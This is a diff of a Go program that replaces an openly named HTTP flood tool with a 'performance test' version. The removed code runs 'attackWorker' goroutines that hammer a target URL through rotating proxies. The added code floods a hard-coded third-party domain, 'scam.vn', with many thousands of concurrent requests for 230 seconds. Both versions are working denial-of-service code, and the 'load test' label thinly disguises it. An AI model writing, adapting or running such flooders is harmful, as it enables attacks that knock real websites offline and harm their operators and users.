@@ -1,112 +1,105 @@
 package main
 
 import (
-	"bufio"
-	"crypto/tls"
-	"fmt"
-	"net/http"
-	"net/url"
-	"os"
-	"sync"
-	"sync/atomic"
-	"time"
-	"runtime"
-	"golang.org/x/net/http2"
+    "fmt"
+    "runtime"
+    "sync"
+    "sync/atomic"
+    "time"
+
+    "github.com/valyala/fasthttp"
 )
-
-const (
-	TargetURL      = "https://example.com" // Change this
-	ThreadsPerCore = 500
-	RequestPerConn = 1000000
-	ProxyFile      = "proxy.txt"
-)
-
-var (
-	proxies      []string
-	requestsSent uint64
-)
-
-// Load proxies from file
-func loadProxies() {
-	file, err := os.Open(ProxyFile)
-	if err != nil {
-		fmt.Println("No proxy file found, using direct connections.")
-		return
-	}
-	defer file.Close()
-
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		proxies = append(proxies, scanner.Text())
-	}
-}
-
-// Create an HTTP/2 compatible client
-func createClient(proxy string) *http.Client {
-	transport := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	}
-
-	if proxy != "" {
-		proxyURL, err := url.Parse("http://" + proxy)
-		if err == nil {
-			transport.Proxy = http.ProxyURL(proxyURL)
-		}
-	}
-
-	http2.ConfigureTransport(transport)
-	return &http.Client{
-		Transport: transport,
-		Timeout:   5 * time.Second,
-	}
-}
-
-func attackWorker(wg *sync.WaitGroup) {
-	defer wg.Done()
-
-	// Select a random proxy
-	proxy := ""
-	if len(proxies) > 0 {
-		proxy = proxies[int(time.Now().UnixNano())%len(proxies)]
-	}
-
-	client := createClient(proxy)
-
-	for i := 0; i < RequestPerConn; i++ {
-		req, err := http.NewRequest("GET", TargetURL, nil)
-		if err != nil {
-			continue
-		}
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-		req.Header.Set("Connection", "keep-alive")
-
-		resp, err := client.Do(req)
-		if err == nil {
-			resp.Body.Close()
-			atomic.AddUint64(&requestsSent, 1)
-		}
-	}
-}
 
 func main() {
-	loadProxies()
-	runtime.GOMAXPROCS(runtime.NumCPU())
+    // Configuration
+    const testDuration = 230 * time.Second
+    url := "http://scam.vn" // Replace with your API URL
 
-	var wg sync.WaitGroup
+    // Optimize runtime
+    runtime.GOMAXPROCS(runtime.NumCPU())
 
-	// Start attack workers
-	for i := 0; i < runtime.NumCPU()*ThreadsPerCore; i++ {
-		wg.Add(1)
-		go attackWorker(&wg)
-	}
+    // Statistics
+    var totalRequests int64
+    var successfulRequests int64
+    var failedRequests int64
+    var peakRPS int64
 
-	// Display request count every second
-	go func() {
-		for {
-			time.Sleep(1 * time.Second)
-			fmt.Printf("Requests sent: %d\n", atomic.LoadUint64(&requestsSent))
-		}
-	}()
+    // Create fasthttp client with optimizations
+    client := &fasthttp.Client{
+        MaxConnsPerHost:     10000,           // High connection limit
+        ReadTimeout:         1 * time.Second, // Fast timeout
+        WriteTimeout:        1 * time.Second,
+        MaxIdleConnDuration: 0, // Keep connections alive
+    }
 
-	wg.Wait()
+    // WaitGroup for goroutines
+    var wg sync.WaitGroup
+    done := make(chan struct{})
+
+    // Track RPS per second
+    rpsTicker := time.NewTicker(1 * time.Second)
+    defer rpsTicker.Stop()
+    var requestsThisSecond int64
+
+    // Start request sender
+    startTime := time.Now()
+    for i := 0; i < runtime.NumCPU()*100; i++ { // Spawn workers based on CPU cores
+        wg.Add(1)
+        go func() {
+            defer wg.Done()
+            for {
+                select {
+                case <-done:
+                    return
+                default:
+                    atomic.AddInt64(&totalRequests, 1)
+                    atomic.AddInt64(&requestsThisSecond, 1)
+
+                    statusCode, _, err := client.Get(nil, url)
+                    if err != nil {
+                        atomic.AddInt64(&failedRequests, 1)
+                        continue
+                    }
+                    if statusCode >= 200 && statusCode < 300 {
+                        atomic.AddInt64(&successfulRequests, 1)
+                    } else {
+                        atomic.AddInt64(&failedRequests, 1)
+                    }
+                }
+            }
+        }()
+    }
+
+    // Track peak RPS
+    go func() {
+        for {
+            select {
+            case <-done:
+                return
+            case <-rpsTicker.C:
+                currentRPS := atomic.SwapInt64(&requestsThisSecond, 0)
+                if currentRPS > peakRPS {
+                    atomic.StoreInt64(&peakRPS, currentRPS)
+                }
+            }
+        }
+    }()
+
+    // Run for 230 seconds
+    time.Sleep(testDuration)
+    close(done)
+    wg.Wait()
+
+    // Calculate results
+    elapsed := time.Since(startTime)
+    averageRPS := float64(totalRequests) / elapsed.Seconds()
+
+    // Print results
+    fmt.Printf("\nPerformance Test Results (230s duration):\n")
+    fmt.Printf("Total Requests: %d\n", totalRequests)
+    fmt.Printf("Successful Requests: %d\n", successfulRequests)
+    fmt.Printf("Failed Requests: %d\n", failedRequests)
+    fmt.Printf("Peak RPS: %d\n", peakRPS)
+    fmt.Printf("Average RPS: %.2f\n", averageRPS)
+    fmt.Printf("Success Rate: %.2f%%\n", float64(successfulRequests)/float64(totalRequests)*100)
 }
